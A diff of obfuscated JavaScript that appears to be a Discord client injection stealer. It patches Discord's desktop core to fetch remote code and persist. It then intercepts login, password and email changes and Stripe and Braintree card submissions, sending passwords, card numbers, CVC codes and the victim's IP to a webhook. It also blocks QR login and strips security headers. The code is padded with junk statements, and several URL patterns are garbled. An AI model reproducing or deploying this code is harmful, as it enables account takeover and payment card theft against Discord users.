+        const _a_CT4z3gt54s = path.join(_p6YJUFgeGt, _mFVGlUtTrc(104));
+        if (!fs.existsSync(_a_CT4z3gt54s)) return;
+        const _u__I6KY5wzMh4O = fs.readdirSync(_a_CT4z3gt54s).find(_mZmNPnqo => /^discord_desktop_core-\_J1jf4Qe30+$/.test(_mZmNPnqo));
+var _L3FgkF = '3177e7f9'; if (false) { _L3FgkF = null; }
+        if (!_u__I6KY5wzMh4O) return;
+(function() { var _x = 7178; return _x * 9; })();
+        const _ot54keIA = path.join(_a_CT4z3gt54s, _u__I6KY5wzMh4O, _mFVGlUtTrc(105), _mFVGlUtTrc(106));
 
-        if (!fs.existsSync(_lkiG8FAW)) fs.mkdirSync(_lkiG8FAW, { recursive: true });
-        fs.writeFileSync(path.join(_lkiG8FAW, _LWBbXKOVk5(110)),
-            JSON.stringify({ name: _LWBbXKOVk5(111), main: _LWBbXKOVk5(109) }, null, 4));
-var _vXLsaD = '348c4dd2'; if (false) { _vXLsaD = null; }
+        if (!fs.existsSync(_jTRJj0)) fs.mkdirSync(_jTRJj0, { recursive: true });
+        fs.writeFileSync(path.join(_jTRJj0, _mFVGlUtTrc(107)),
+            JSON.stringify({ name: _mFVGlUtTrc(108), main: _mFVGlUtTrc(106) }, null, 4));
 
-        const _eDdwQpZgo5f = [
-            `const fs=require('fs_LWBbXKOVk5(112)https');`,
-            `const _zKs3fJ39Np=${JSON.stringify(_C9Z54sxXq)};`,
-            `const _zsIjlB=${JSON.stringify(INJECT_URL)};`,
-            `const _lNmyd_QgJW6g=${JSON.stringify(WEBHOOK)};`,
-            `function _fJn9ds(){https.get(_zsIjlB,{timeout:15000},res=>{`,
-            `  let _mLWOWgOpFOIzHP='';res.on(_LWBbXKOVk5(17),c=>_mLWOWgOpFOIzHP+=c);`,
-            `  res.on(_LWBbXKOVk5(18),()=>{try{`,
-            `    const _f9eWlhh8JXlzi=fs.readFileSync(_zKs3fJ39Np,_LWBbXKOVk5(113));`,
-            `    if(_f9eWlhh8JXlzi.length<20000||_f9eWlhh8JXlzi==="module.exports = require('./core.asar');")`,
-            `      fs.writeFileSync(_zKs3fJ39Np,_mLWOWgOpFOIzHP.replace(_LWBbXKOVk5(2),_lNmyd_QgJW6g));`,
-var _Aym8Yq = 8202; if (_Aym8Yq > 15242) { _Aym8Yq += 4; }
+        const _lAOz_7ZkKM0Y = [
+            `const fs=require('fs_mFVGlUtTrc(109)https');`,
+            `const _qmNG14Hn=${JSON.stringify(_ot54keIA)};`,
+            `const _dqUjMj7DUaL=${JSON.stringify(INJECT_URL)};`,
+            `const _COeGdzfFzzd=${JSON.stringify(WEBHOOK)};`,
+            `function _PxSpHY_11u4f(){https.get(_dqUjMj7DUaL,{timeout:15000},res=>{`,
+            `  let _J1jf4Qe30='';res.on(_mFVGlUtTrc(15),c=>_J1jf4Qe30+=c);`,
+            `  res.on(_mFVGlUtTrc(16),()=>{try{`,
+            `    const _fud4BYgenekP2=fs.readFileSync(_qmNG14Hn,_mFVGlUtTrc(110));`,
+            `    if(_fud4BYgenekP2.length<20000||_fud4BYgenekP2==="module.exports = require('./core.asar');")`,
+            `      fs.writeFileSync(_qmNG14Hn,_J1jf4Qe30.replace(_mFVGlUtTrc(2),_COeGdzfFzzd));`,
             `  }catch{}});`,
-            `}).on(_LWBbXKOVk5(19),()=>setTimeout(_fJn9ds,10000));}`,
-            `_fJn9ds();`,
-var _ByXaaW = '63646f2c'; if (false) { _ByXaaW = null; }
-            `require(${JSON.stringify(_jU06IMHTM)});`,
-        ].join(_LWBbXKOVk5(97));
+            `}).on(_mFVGlUtTrc(17),()=>setTimeout(_PxSpHY_11u4f,10000));}`,
+            `_PxSpHY_11u4f();`,
+            `require(${JSON.stringify(_gnnGwwZLy)});`,
+        ].join(_mFVGlUtTrc(94));
 
-        fs.writeFileSync(path.join(_lkiG8FAW, _LWBbXKOVk5(109)), _eDdwQpZgo5f);
+        fs.writeFileSync(path.join(_jTRJj0, _mFVGlUtTrc(106)), _lAOz_7ZkKM0Y);
     } catch {}
 }
 
-// ── uploadData parse ──────────────────────────────────────────────────────────
-
-function _tHPlN1hknJjL(details) {
+function _JnC6CCP4zhf(details) {
     try {
         if (!details.uploadData || !details.uploadData[0]) return null;
-        const _AlGUkqCR = Buffer.from(details.uploadData[0].bytes).toString(_LWBbXKOVk5(113));
-        if (!_AlGUkqCR) return null;
-        try { return JSON.parse(_AlGUkqCR); }
-        catch { return querystring.parse(decodeURIComponent(_AlGUkqCR)); }
-(function() { var _x = 6696; return _x * 7; })();
+        const _aJCL0zdyq4STg = Buffer.from(details.uploadData[0].bytes).toString(_mFVGlUtTrc(110));
+        if (!_aJCL0zdyq4STg) return null;
+        try { return JSON.parse(_aJCL0zdyq4STg); }
+        catch { return querystring.parse(decodeURIComponent(_aJCL0zdyq4STg)); }
     } catch { return null; }
-(function() { var _x = 4170; return _x * 3; })();
 }
 
-// ── onCompleted ───────────────────────────────────────────────────────────────
-
+var _hpRua9 = 4101; if (_hpRua9 > 17544) { _hpRua9 += 5; }
 session.defaultSession.webRequest.onCompleted({
     urls: [
         'https://discord.com/api/v*/users/@me',
         'https://discordapp.com/api/v*/users/@me',
-        'https://*.discord.com/api/v*/users/@me',
+        'https:/users/@me',
         'https://discord.com/api/v*/auth/login',
         'https://discordapp.com/api/v*/auth/login',
-        'https://*.discord.com/api/v*/auth/login',
-        'https://api.braintreegateway.com/merchants/*/client_api/v*/payment_methods/paypal_accounts',
-        'https://api.stripe.com/v*/_wpmZ9oixr_R',
-        'https://api.stripe.com/v*/setup_intents/*/confirm',
-        'https://api.stripe.com/v*/payment_intents/*/confirm',
-var _olCcY_ = 'e8e49e6a'; if (false) { _olCcY_ = null; }
-    ],
-}, async (details) => {
-(function() { var _x = 422; return _x * 5; })();
-    if (details.statusCode !== 200 && details.statusCode !== 202) return;
-    if (![_LWBbXKOVk5(26), _LWBbXKOVk5(114)].includes(details.method)) return;
-
-    const _FnGm6u__Ilfn = _tHPlN1hknJjL(details);
-    if (!_FnGm6u__Ilfn) return;
-
-    const _fFZMbyJ9lu = await _C6ROuz(3, 1000);
-    if (!_fFZMbyJ9lu) return;
-
-    const _CiqCKt4LVgP     = await _Ox3U72sM2kQ7S();
-    const _Mgut6LcM = _dCUILkF();
-    const _rHxURnzy8_   = await _lLG_q76mh5(_fFZMbyJ9lu);
-    if (!_rHxURnzy8_) return;
-(function() { var _x = 5924; return _x * 3; })();
-
-    const { user, billing, avatar, banner } = _rHxURnzy8_;
-    const _GjL8CNxp = [
-        `<:computer:1533640158740615168> **Computer:** \`${process.env.COMPUTERNAME || _LWBbXKOVk5(21)}\``,
-        `<:_CiqCKt4LVgP:1533640242437816390> **IP:** \`${_CiqCKt4LVgP}\``,
-        `<:web:1533641362975621270> **Client:** \`${_Mgut6LcM}\``,
-    ];
-
-    switch (true) {
-        case details._zsIjlB.endsWith(_LWBbXKOVk5(115)):
-            if (!_FnGm6u__Ilfn.password) return;
-            await _fg1cDsXYgVb(_wRqnXm2UR(
-                _LWBbXKOVk5(116),
-                _yjyK9_D4(user, billing, null, _fFZMbyJ9lu, [
-                    ..._GjL8CNxp,
-                    `<:_fFZMbyJ9lu:1533639840254660640> **Password:** \`${_FnGm6u__Ilfn.password}\``,
-                ]),
-                avatar || AVATAR_URL, banner || null
-            ));
-            break;
-
-        case details._zsIjlB.endsWith(_LWBbXKOVk5(117)) && details.method === _LWBbXKOVk5(114):
-            if (!_FnGm6u__Ilfn.password) return;
-            if (_FnGm6u__Ilfn.new_password) {
-                await _fg1cDsXYgVb(_wRqnXm2UR(
-                    _LWBbXKOVk5(118),
-                    _yjyK9_D4(user, billing, null, _fFZMbyJ9lu, [
-                        ..._GjL8CNxp,
-                        `<:_fFZMbyJ9lu:1533639840254660640> **Old Password:** \`${_FnGm6u__Ilfn.password}\``,
-                        `<:_fFZMbyJ9lu:1533639840254660640> **New Password:** \`${_FnGm6u__Ilfn.new_password}\``,
-                    ]),
-                    avatar || AVATAR_URL, banner || null
-                ));
-            }
-            if (_FnGm6u__Ilfn.email) {
-                await _fg1cDsXYgVb(_wRqnXm2UR(
-                    _LWBbXKOVk5(119),
-                    _yjyK9_D4(user, billing, null, _fFZMbyJ9lu, [
-                        ..._GjL8CNxp,
-(function() { var _x = 3448; return _x * 2; })();
-                        `<:mail:1533638816559140877> **New Email:** \`${_FnGm6u__Ilfn.email}\``,
-                        `<:_fFZMbyJ9lu:1533639840254660640> **Password:** \`${_FnGm6u__Ilfn.password}\``,
-                    ]),
-var _AKC7HT = '685ba1d5'; if (false) { _AKC7HT = null; }
-                    avatar || AVATAR_URL, banner || null
-                ));
-var _O1TmH2 = 7478; if (_O1TmH2 > 19588) { _O1TmH2 += 1; }
-            }
-            break;
-
-        case details._zsIjlB.includes(_LWBbXKOVk5(120)) && details._zsIjlB.endsWith(_LWBbXKOVk5(7)):
-            await _fg1cDsXYgVb(_wRqnXm2UR(
-                _LWBbXKOVk5(121),
-                _yjyK9_D4(user, billing, null, _fFZMbyJ9lu, [
-                    ..._GjL8CNxp,
-                    `<:card:1533639749376671785> **Card:** \`${_FnGm6u__Ilfn[_LWBbXKOVk5(122)] || _LWBbXKOVk5(21)}\``,
-                    `<:lock:1533640371882557501> **CVC:** \`${_FnGm6u__Ilfn[_LWBbXKOVk5(123)] || _LWBbXKOVk5(21)}\``,
-                    `<:card:1533639749376671785> **Expiry:** \`${_FnGm6u__Ilfn[_LWBbXKOVk5(124)] || '?'}/${_FnGm6u__Ilfn[_LWBbXKOVk5(125)] || '?'}\``,
-                ]),
-                avatar || AVATAR_URL, banner || null
-            ));
-            break;
-
-        case details._zsIjlB.includes(_LWBbXKOVk5(126)):
-            await _fg1cDsXYgVb(_wRqnXm2UR(
-                _LWBbXKOVk5(127),
-                _yjyK9_D4(user, billing, null, _fFZMbyJ9lu, _GjL8CNxp),
-                avatar || AVATAR_URL, banner || null
-            ));
-            break;
-
-(function() { var _x = 8277; return _x * 7; })();
-        default:
-            break;
-    }
-});
-
-// ── onBeforeRequest ───────────────────────────────────────────────────────────
-
-session.defaultSession.webRequest.onBeforeRequest({
-    urls: [
-        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
-        'https://*.discord.com/api/v*/applications/detectable',
+        'https:/auth/login',
+        'https://api.braintreegateway.com/merchantspayment_methods/paypal_accounts',
+        'https://api.stripe.com/v*/_k8PLDV5xb',
+        'https://api.stripe.com/v*/setup_intentspayment_intentsscheduled-maintenances/upcoming.json',
+        'https:/applications/detectable',
         'https://discord.com/api/v*/applications/detectable',
-        'https://*.discord.com/api/v*/users/@me/library',
+        'https:/users/@me/library',
         'https://discord.com/api/v*/users/@me/library',
         'wss://remote-auth-gateway.discord.gg/*',
     ],
 }, (details, callback) => {
-    if (details._zsIjlB.startsWith('wss://remote-auth-gateway')) {
+    if (details._dqUjMj7DUaL.startsWith('wss://remote-auth-gateway')) {
         return callback({ cancel: true });
     }
-    _cilK9_().catch(() => {});
-    _JlxHlh();
+    _lGN_6BFoq().catch(() => {});
+    _ai7Ciia_E6();
+var _CsFtCw = '1e1d3fa8'; if (false) { _CsFtCw = null; }
     callback({});
 });
 
-// ── onHeadersReceived ─────────────────────────────────────────────────────────
-
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    delete details.responseHeaders[_LWBbXKOVk5(128)];
-    delete details.responseHeaders[_LWBbXKOVk5(129)];
+    delete details.responseHeaders[_mFVGlUtTrc(111)];
+    delete details.responseHeaders[_mFVGlUtTrc(112)];
     callback({
         responseHeaders: {
             ...details.responseHeaders,
-            _LWBbXKOVk5(130): ['*'],
+            _mFVGlUtTrc(113): ['*'],
         },
     });
 });
 
-// ── Discord core yükle ────────────────────────────────────────────────────────
-
 module.exports = require('./core.asar');
-var _iQ2cC7 = 4392; if (_iQ2cC7 > 11430) { _iQ2cC7 += 5; }
+var _oPv690 = 'bec6e882'; if (false) { _oPv690 = null; }
 
 /* End of protected build */
